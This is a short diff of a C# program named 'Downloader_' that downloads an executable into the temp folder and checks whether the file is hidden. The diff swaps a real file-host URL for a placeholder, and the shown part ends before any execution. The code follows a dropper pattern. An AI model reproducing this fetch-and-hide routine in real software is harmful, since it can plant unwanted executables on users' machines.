@@ -12,10 +12,10 @@ namespace Downloader_
         static void Main(string[] args)
         {
             WebClient wc = new WebClient();             
-            string filepath = Path.GetTempPath() + "filedddddname.exe";
+            string filepath = Path.GetTempPath() + "filename.exe";
             try
             {
-                byte[] bytes = wc.DownloadData("http://updo.nl/file/2efd63fc.exe");
+                byte[] bytes = wc.DownloadData("http://url.com/file.exe");
                 File.WriteAllBytes(filepath, bytes);
                 FileInfo fi = new FileInfo(filepath);
                 if (fi.Attributes != FileAttributes.Hidden)
